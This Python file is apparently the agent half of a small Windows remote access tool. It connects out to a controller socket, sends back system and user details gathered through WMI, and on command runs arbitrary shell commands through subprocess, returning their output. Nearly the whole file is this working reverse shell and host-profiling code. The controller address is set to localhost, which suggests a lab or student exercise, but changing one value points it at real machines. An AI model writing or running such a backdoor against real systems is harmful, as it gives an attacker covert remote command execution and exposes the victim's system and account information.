# -*- coding: utf-8 -*-
import socket
import sys
import os
import wmi
import psutil
import uuid
import json
import getpass
import subprocess


class exchange():

    def __init__(self):
        self.ip = "localhost"
        self.port = 60000
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        self.s.connect((self.ip, self.port))
        print("*** Connected ***")

    def sending(self, message):
        message = message.encode("utf-8")
        self.s.send(message)

    def get_mess(self):
        messagercv = None
        while messagercv != "exit" :
            messagercv = self.receive()
            if messagercv == "InfoSystem":
                self.get_info()
            elif messagercv == "shell_att" :
                self.remote_shell(messagercv)
        self.s.close()

    def get_info(self):
        # pour une question de compréhension et facilité de lecture les noms ont été changé
        computer = wmi.WMI()
        os_info = computer.Win32_OperatingSystem()[0]
        proc_info = computer.Win32_Processor()[0]
        gpu_info = computer.Win32_VideoController()[0]
        os_name = os_info.Name.split('|')[0]
        os_version = ' '.join([os_info.Version, os_info.BuildNumber])
        ram = round(float(os_info.TotalVisibleMemorySize) /
                    1048576)  # KB to GB
        addrs = psutil.net_if_addrs()
        user = getpass.getuser()

        data = {
            "infosys": {
                "os_name": os_name,
                "os_version": os_version,
                "user": user,
                "cpu": proc_info.Name,
                "ram": ram,
                "gpu": gpu_info.Name,
                "interface": addrs
            }
        }
        self.sending(json.dumps(data))

    def remote_shell(self,command):
        self.sending(os.getcwd())
        command = self.receive()
        while command.lower() != "quit":
            if "cd" in command :
                path = os.getcwd()
                try:
                    os.chdir(command.split(" ")[1])
                    path = os.getcwd()
                except:
                    pass
                self.sending(path)
            else:
                output = subprocess.getoutput(command)
                self.sending(output)
            
            command = self.receive()

    def receive(self):
        try:
            self.msg = self.s.recv(1024).decode("utf-8")
        except socket.timeout:
            return "exit"
        return self.msg
        



ex = exchange()
ex.connect()
ex.get_mess()
